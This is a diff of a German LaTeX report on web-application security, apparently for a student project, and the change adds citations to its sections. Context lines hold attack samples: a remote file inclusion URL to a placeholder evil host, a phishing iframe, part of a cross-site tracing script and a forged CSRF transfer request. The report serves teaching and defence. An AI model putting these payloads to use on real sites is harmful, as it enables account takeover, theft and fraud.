@@ -60,6 +60,7 @@ Die dabei geltenden Faktoren lauten:
 \end{enumerate}
 Ein gutes Beispiel für die Zweifaktorauthentifizierung ist die Behebung von Geld an einem Geldautomaten. Nur die korrekte Kombination einer Bankkarte (die der Benutzer besitzt) und einer PIN (die der Benutzer weiß) ermöglicht die Durchführung der Transaktion.\\ \\Als neueres Beispiel könnte man das Anmelden von seinem Google Account nehmen, wo man sein Passwort wissen muss und mit seinem Handy bestätigen, das man sich einloggen will, also etwas das man weiß und etwas was man hat. 
 
+\textcite{2FA}
 \subsubsection{2FA Login Code}
 \label{sec:2FALogin}
 \begin{lstlisting}
@@ -146,7 +147,8 @@ Anhand dieser Beispiele kann man sehen, das einem diese Schwäche ermöglicht lo
 Unter Linux ist diese Schwäche kritischer da man hier auf die komplette Festplatte Zugriff bekommt. In Windows kann man sich nur im lokalen Directory bewegen, wo sich die Website befindet.
 \\ \\
 Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese code einzufügen mit dem man sich noch mehr Möglichkeiten verschafft. \\ \\
-\url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}
+\url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}\\ \\
+\textcite{Path-Trav}
 \subsubsection{Protection Path-Traversal}
 \label{sec:PPT}
 \subsection{XSS Protection}
@@ -172,6 +174,7 @@ Der Grund hierfür ist das Javascript quasi eine fundamentale Einheit einer Webs
 \item Website-Defacements 
 \item Phishing
 \end{enumerate}
+\textcite{XSS}
 \subsubsection{Session Hijacking}
 \label{sec:xss_session_hijacking}
 Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein User gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei das überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Admin Session zugänglich wird und der Angreifer so auf einen Admin Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Und hier reicht schon eine kleine XSS Vulnerability aus um dies zu bewerkstelligen. 
@@ -211,6 +214,7 @@ Es ergibt sich daraus \\ \\
 <iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>
 \\ \\
 Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angreifen eingegebene Daten vom User zu sehen. 
+\textcite{Phishing}
 \subsubsection{Cross-Site-Tracing XST}
 \label{sec:CSTXST}
 Beim Cross-Site-Tracing wird XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert auf gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für das Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
@@ -230,6 +234,7 @@ Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
   xmlhttp.send();
 </script>
 \end{lstlisting}
+\textcite{XST}
 \subsubsection{Wie wird XSS Protection gewährleistet}
 \label{sec:xss_prot}
 Die Webseite beschränkt sich generell auf wenige Eingabe fenster wo eine Standard XSS versucht werden könnte. Alle diese Eingaben erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL Faktor weg.
@@ -272,6 +277,7 @@ Auch eine Post Request ist möglich
 POST http://bank.com/transfer.do HTTP/1.1
 acct=Angreifer&amount=1000
 \end{lstlisting}
+\textcite{CSRF}
 \subsubsection{Verhindern}
 \label{sec:xsrf_prevent}
 \url{https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2}
@@ -353,7 +359,7 @@ Formel 1:
 \\ \\Formel 2:\\ \\
 \includegraphics[width=280px ,height=30px]{Webseite_SHA256_f2}
 \\ \\
-(was passiert hier)
+\textcite{sha256}
 \subsection{Password Hashes}
 \label{sec:pwdhash}
 Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner User hasht.
@@ -480,8 +486,7 @@ Eine Controller-Aktion gibt ein so genanntes Aktionsergebnis zurück. Ein Aktion
 \item FileStreamResult - Represents a downloadable file (with a file stream).
 \end{enumerate}
 Alle diese Resultate kommen von der Basis Klasse ActionResult.
-
-%(https://docs.microsoft.com/en-us/aspnet/mvc/overview/older-versions-1/controllers-and-routing/aspnet-mvc-controllers-overview-cs 27.02)
+\textcite{mic_controller}
 
 \subsection{Views}
 \label{sec:Views}
@@ -530,7 +535,7 @@ Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
 }
 \end{lstlisting}
 (erklären)
-%https://docs.microsoft.com/en-us/aspnet/mvc/overview/older-versions-1/views/asp-net-mvc-views-overview-cs
+\textcite{mic_views}
 \subsection{User Datenbank}
 \label{sec:UserDB}
 \begin{itemize}
